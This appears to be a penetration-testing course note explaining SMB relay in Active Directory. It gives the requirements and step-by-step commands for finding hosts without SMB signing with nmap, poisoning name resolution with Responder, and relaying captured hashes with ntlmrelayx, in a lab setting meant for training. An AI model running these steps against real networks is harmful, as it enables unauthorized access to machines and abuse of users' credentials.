___
### What is SMB Relay?
- Instead of cracking hashes gathered with Responder, we can instead relay those hashes to specific machines and potentially gain access.

### Requirements 
- SMB signing must be disabled or not enforced on the target.
- Relayed user credentials must be admin on machine for any real value.

### Identify Hosts Without SMB Signing

```
nmap --script=smb2-security-mode.nse -p445 10.0.0.0/24
```
![](Courses/TCM%20Practical%20Ethical%20Hacking/Domain%207%20-%20Active%20Directory%20Initial%20Attack%20Vectors/assests/Pasted%20image%2020251025150646.png)

### SMB Relay

Step 1 : Run Responder
```
sudo mousepad /etc/responder/Responder.conf
```
![](Courses/TCM%20Practical%20Ethical%20Hacking/Domain%207%20-%20Active%20Directory%20Initial%20Attack%20Vectors/assests/Pasted%20image%2020251025150836.png)

Step 2 : Run Responder
```
sudo responder -I tun0 -dwP
```
![](Courses/TCM%20Practical%20Ethical%20Hacking/Domain%207%20-%20Active%20Directory%20Initial%20Attack%20Vectors/assests/Pasted%20image%2020251025151048.png)

Step 3 : Set up your relay
```
sudo ntlmrelayx.py -tf targets.txt -smb2support
```
![](Courses/TCM%20Practical%20Ethical%20Hacking/Domain%207%20-%20Active%20Directory%20Initial%20Attack%20Vectors/assests/Pasted%20image%2020251025151158.png)
Step 4 : An Event Occurs...
![](Courses/TCM%20Practical%20Ethical%20Hacking/Domain%207%20-%20Active%20Directory%20Initial%20Attack%20Vectors/assests/Pasted%20image%2020251025151309.png)

Step 5 : Win
![](Courses/TCM%20Practical%20Ethical%20Hacking/Domain%207%20-%20Active%20Directory%20Initial%20Attack%20Vectors/assests/Pasted%20image%2020251025151426.png)




